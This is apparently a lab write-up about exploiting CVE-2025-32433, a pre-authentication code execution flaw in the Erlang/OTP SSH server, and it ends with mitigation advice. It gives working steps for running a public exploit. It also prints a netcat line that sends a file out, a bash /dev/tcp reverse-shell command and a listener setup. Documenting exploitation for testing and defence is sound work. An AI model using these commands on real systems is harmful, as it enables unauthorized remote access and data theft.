# Erlang/OTP SSH: CVE-2025-32433

## üéØ **Target:**
- **Service**: Erlang/OTP SSH Service (version 5.2.9)
- **Vulnerability**: **CVE-2025-32433** ‚Äì Remote Code Execution via SSH



## üìù **Overview**

During the engagement, the **Erlang/OTP SSH server** (version 5.2.9) was identified as vulnerable to **CVE-2025-32433**. This vulnerability allows remote attackers to execute arbitrary commands on the target system by sending a specially crafted SSH message prior to authentication.



## üí• **Exploit Details**

**Exploit Source**:  
- **Repository**: [ProDefense GitHub](https://github.com/ProDefense/CVE-2025-32433)

The vulnerability was confirmed by executing the following steps:

**Clone the Exploit Repository**:
   ```
   git clone https://github.com/ProDefense/CVE-2025-32433
   ```
   
**Run the Exploit:**

Using Python 3, the exploit was executed as follows:
```
python3 CVE-2025-32433.py
```

The following output was observed:

```
[*] Connecting to SSH server...
[+] Received banner: SSH-2.0-Erlang/5.2.9
[*] Sending SSH_MSG_KEXINIT...
[*] Sending SSH_MSG_CHANNEL_OPEN...
[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
[‚úì] Exploit sent! If the server is vulnerable, it should have written to /lab.txt.
[+] Received response: ...
```

**Modification to Command Execution:**
The original exploit writes to `/lab.txt` to verify code execution. However, to confirm the attack‚Äôs success, the following change was made to trigger a reverse shell:

```
command='os:cmd("cat /lab.txt | nc 10.9.2.46 4444").'
```
This would send the contents of /lab.txt back to the attack machine.

## üíª Gaining Shell Access
A reverse shell was successfully obtained by altering line 108 of the exploit:

```
command='os:cmd("bash -c \\"bash -i >& /dev/tcp/10.9.2.46/4444 0>&1\\"").'
```
This triggers the target system to establish an outbound connection to the attack machine on port 4444 and provide an interactive shell.

**Listener Setup:**
The attacker‚Äôs machine listens on port 4444 for the reverse shell:
`nc -lvnp 4444`

**Connection:**
After executing the modified exploit, the following output confirmed a successful connection:

```
connect to [my_ip] from (UNKNOWN) [attack_ip] 40852
pwned sent 0, rcvd 5
```

The output pwned was returned, confirming the reverse shell was successful.

## ‚ö†Ô∏è Impact
Exploitation of this vulnerability allows an attacker to execute arbitrary commands on the vulnerable Erlang/OTP SSH server before authentication. This can lead to:

- Remote Code Execution (RCE).

- Potential full system compromise if an attacker escalates privileges.

This type of vulnerability is particularly dangerous as it is a **pre-authentication attack**, meaning the attacker does not need valid credentials to exploit it.

##üõ°Ô∏è Mitigation & Recommendations
To address CVE-2025-32433, the following steps are recommended:

- **Upgrade Erlang/OTP:**
Upgrade to **Erlang/OTP 26.2.4** or later, as these versions include fixes for this vulnerability.

- **Disable Erlang SSH Server (if not needed):**
If the SSH server is not necessary for your application, it should be disabled to prevent exploitation:
`application:stop(ssh).`

- **Firewalling and Segmentation:**
If the Erlang/OTP SSH server must remain accessible, ensure that access is restricted to trusted IPs and that the service is segmented from the public network.

## üîö Conclusion
The vulnerability **CVE-2025-32433** in the Erlang/OTP SSH server allows for pre-authentication remote code execution, which could lead to full system compromise. The attack was successfully demonstrated by exploiting the flaw to write to a file and gain reverse shell access.